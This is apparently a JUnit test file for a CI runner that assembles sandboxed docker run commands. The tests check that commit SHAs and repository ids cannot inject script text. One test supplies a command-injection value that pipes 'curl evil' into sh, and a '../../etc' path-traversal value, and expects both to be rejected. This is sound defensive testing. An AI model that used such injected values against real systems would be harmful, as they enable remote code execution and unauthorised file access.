package eu.wohlben.qits.ci.control;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.ci.control.CiStepRunner.StepSpec;
import eu.wohlben.qits.ci.error.BadRequestException;
import java.util.List;
import org.junit.jupiter.api.Test;

/**
 * Argv/composite assembly only — the real docker execution is covered by the extended {@code
 * CiDockerRunnerIT} in the service module.
 */
public class CiDockerRunnerTest {

  private CiDockerRunner runner() {
    CiDockerRunner runner = new CiDockerRunner();
    runner.runtime = "docker";
    runner.network = "qits-net";
    runner.containerGitUrl = "http://qits:8080/";
    runner.stepTimeoutSeconds = 900;
    runner.outputMaxChars = 65536;
    runner.memoryLimit = "4g";
    runner.pidsLimit = "2048";
    runner.cpus = "2";
    return runner;
  }

  private final StepSpec spec =
      new StepSpec(
          "0123456789abcdef-run", 2, "repo-1", "cafebabe", "maven:3.9", "./mvnw -q verify");

  @Test
  public void buildsTheDockerRunArgv() {
    List<String> argv = runner().buildArgv(spec);
    assertEquals(
        List.of(
            "docker",
            "run",
            "--rm",
            "--name",
            "qits-ci-01234567-2",
            "--network",
            "qits-net",
            "--add-host=host.docker.internal:host-gateway",
            "--label",
            "qits.ci.run=0123456789abcdef-run",
            "--security-opt=no-new-privileges",
            "--cap-drop=ALL",
            "--memory",
            "4g",
            "--memory-swap",
            "4g",
            "--pids-limit",
            "2048",
            "--cpus",
            "2",
            "maven:3.9",
            "bash",
            "-c",
            runner().composite(spec),
            "qits-ci",
            "http://qits:8080/git/repo-1",
            "cafebabe"),
        argv);
  }

  @Test
  public void cloneUrlAndShaRideAsPositionalArgumentsNotInterpolated() {
    // The hostile-input guard: a sha can never become script text, so it cannot inject commands.
    String composite = runner().composite(spec);
    assertFalse(composite.contains("cafebabe"), composite);
    assertFalse(composite.contains("repo-1"), composite);
    assertTrue(composite.contains("git clone -q \"$1\" /workspace"), composite);
    assertTrue(composite.contains("git checkout -q \"$2\""), composite);
    // ...and they are the trailing argv entries, after the script text.
    List<String> argv = runner().buildArgv(spec);
    assertEquals(
        List.of("qits-ci", "http://qits:8080/git/repo-1", "cafebabe"),
        argv.subList(argv.size() - 3, argv.size()));
  }

  @Test
  public void preludeFailureIsTrappedAndTheTrapIsClearedBeforeTheScript() {
    String composite = runner().composite(spec);
    assertTrue(composite.startsWith("set -e\n"), composite);
    // A FAILURE sentinel (emitted where the failure happens, so it survives tail-truncation of a
    // chatty step) rather than a success marker printed before the script.
    int trap = composite.indexOf("trap 'echo " + CiDockerRunner.PRELUDE_FAILED_MARKER);
    assertTrue(trap >= 0, composite);
    assertTrue(trap < composite.indexOf("git clone"), "the trap must guard the prelude");
    int cleared = composite.indexOf("trap - ERR");
    assertTrue(cleared > composite.indexOf("git checkout"), "cleared after the prelude");
    assertTrue(
        cleared < composite.indexOf("./mvnw -q verify"),
        "the user's script must not raise the prelude trap");
    assertTrue(composite.endsWith("set +e\n./mvnw -q verify"), composite);
  }

  @Test
  public void hostileIdentifiersAreRejectedBeforeAnyDockerCall() {
    CiDockerRunner runner = runner();
    StepSpec injected = new StepSpec("run", 0, "repo-1", "x\"; curl evil | sh #", "img", "echo hi");
    assertThrows(BadRequestException.class, () -> runner.run(injected));
    StepSpec traversal = new StepSpec("run", 0, "../../etc", "cafebabe", "img", "echo hi");
    assertThrows(BadRequestException.class, () -> runner.run(traversal));
  }

  @Test
  public void shortRunIdsAreUsedWholeInTheContainerName() {
    StepSpec shortSpec = new StepSpec("abc", 0, "r", "cafebabe", "img", "sc");
    assertEquals("qits-ci-abc-0", CiDockerRunner.containerName(shortSpec));
  }
}
